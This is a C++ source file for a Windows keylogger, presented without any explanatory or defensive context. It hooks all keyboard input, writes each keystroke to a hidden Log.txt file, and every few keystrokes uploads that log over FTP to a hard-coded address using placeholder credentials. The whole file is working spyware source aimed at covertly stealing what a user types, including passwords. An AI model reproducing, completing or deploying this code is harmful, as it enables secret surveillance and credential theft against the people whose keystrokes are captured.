#include <Windows.h>
#include <WinUser.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <shlobj.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
using namespace std;

HHOOK hKeyboardHook;
DWORD WINAPI Run(void);
LRESULT CALLBACK Keylogger(int nCode, WPARAM wParam, LPARAM lParam);
BOOL uploadFile(char *filename, char *destination_name, char *address, char *username, char *password);
void ProcessMessage(void);

int cc = 0;

int main(void)
{
	SetConsoleCP(1251);
	SetConsoleOutputCP(1251);
	Run();

	return 0;
}

void ProcessMessage(void)
{
	MSG message;
	
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

DWORD WINAPI Run(void)
{
	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger, GetModuleHandle(NULL), 0);

	ProcessMessage();

	UnhookWindowsHookEx(hKeyboardHook);
	hKeyboardHook = NULL;

	return 0;
}

LRESULT CALLBACK Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam);
	HKL keyboard_layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
	WORD symbol = NULL;
	BYTE keyboard_state[256];
	wchar_t unicodesymbol = NULL;
	char lpzsname[0x100] = { 0 };
	DWORD dwMsg = 1;
	int keys[9] = { 0x08, 0x0d, 0x10, 0x11, 0x12, 0x14, 0x1b, 0x2e, 0x00 };
	bool flag_sys = false;
	ofstream out;

	out.open("Log.txt", ios::app);
	if (GetFileAttributes("Log.txt") != 0x22)
		SetFileAttributes("Log.txt", 0x22);

	GetKeyboardState(keyboard_state);

	dwMsg += cKey.scanCode << 16;
	dwMsg += cKey.flags << 24;

	GetKeyNameText(dwMsg, (LPTSTR)lpzsname, 255);

	//ToUnicodeEx(cKey.vkCode, cKey.scanCode, keyboard_state, &unicodesymbol, 1, 0, keyboard_layout);
	ToAsciiEx(cKey.vkCode, cKey.scanCode, keyboard_state, &symbol, 0, keyboard_layout);

	for (int i = 0; i < 10; i++)
	{
		if (symbol == keys[i])
			flag_sys = true;
	}

	if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && flag_sys == false)
	{
		cout << (char)symbol;
		out <<  (char)symbol;
	}
	if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && flag_sys == true)
	{
		cout << "[" << lpzsname << "]";
		out  << "[" << lpzsname << "]";
	}
	out.close();

	cc++;

	if (cc == 5)
	{
		bool res = uploadFile("Log.txt", "Log1.txt", "192.168.0.1", "login", "passwd");
		cc = 0;
	}

	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

BOOL uploadFile(char *filename, char *destination_name, char *address, char *username, char *password)
{
	BOOL t = false;
	HINTERNET hint, hftp;
	hint = InternetOpen("FTP", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC);
	hftp = InternetConnect(hint, address, INTERNET_DEFAULT_FTP_PORT, username, password, INTERNET_SERVICE_FTP, 0, 0);
	t = FtpPutFile(hftp, filename, destination_name, FTP_TRANSFER_TYPE_BINARY, 0);
	InternetCloseHandle(hftp);
	InternetCloseHandle(hint);
	return t;
}